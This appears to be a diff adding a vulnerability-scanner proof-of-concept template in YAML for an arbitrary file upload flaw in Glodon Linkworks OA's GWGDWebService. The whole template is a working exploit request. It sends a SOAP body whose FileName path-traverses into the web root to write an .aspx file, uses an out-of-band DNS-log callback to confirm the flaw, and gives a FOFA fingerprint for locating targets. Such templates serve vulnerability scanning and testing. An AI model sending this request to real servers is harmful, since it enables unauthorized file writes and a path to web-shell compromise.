@@ -1,0 +1,31 @@
+id: poc-yaml-glodon-gwgdwebservice-anyfile-upload
+info:
+  name: 广联达OA GWGDWebService 任意文件上传漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 两高一弱
+  - 文件上传
+  finger: 广联达 Linkworks办公OA
+  fofa: fid="/yV4r5PdARKT4jaqLjJYqw=="
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /GB/LK/ArchiveManagement/Js/GWGDWebService.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:tem=\"http://tempuri.org/\">\n  <soapenv:Header/>\n  <soapenv:Body>\n\
+    \      <tem:GetGWGDData>\n        <!--Optional:-->\n        <tem:data>\n     \
+    \       <root>\n              <GWINFO>\n                  <公文标题>1</公文标题>\n   \
+    \               <拟稿人>拟稿人</拟稿人>\n                  <主送单位>主送单位</主送单位>\n        \
+    \          <主题词>主题词</主题词>\n                  <印发份数>1</印发份数>\n                \
+    \  <签发日期>2022-12-07</签发日期>\n              </GWINFO>\n              <aa>\n    \
+    \              <FileName>./../../../../../../../applications/gtp-default/Web/Common/768a9b.aspx</FileName>\n\
+    \                  <DownLoadURL>http://{{.domain}}</DownLoadURL>\n           \
+    \   </aa>\n            </root>\n        </tem:data>\n      </tem:GetGWGDData>\n\
+    \  </soapenv:Body>\n</soapenv:Envelope>"
+  expression: contains(body,"服务器无法处理请求") && reverse.Verify()
+transport: http
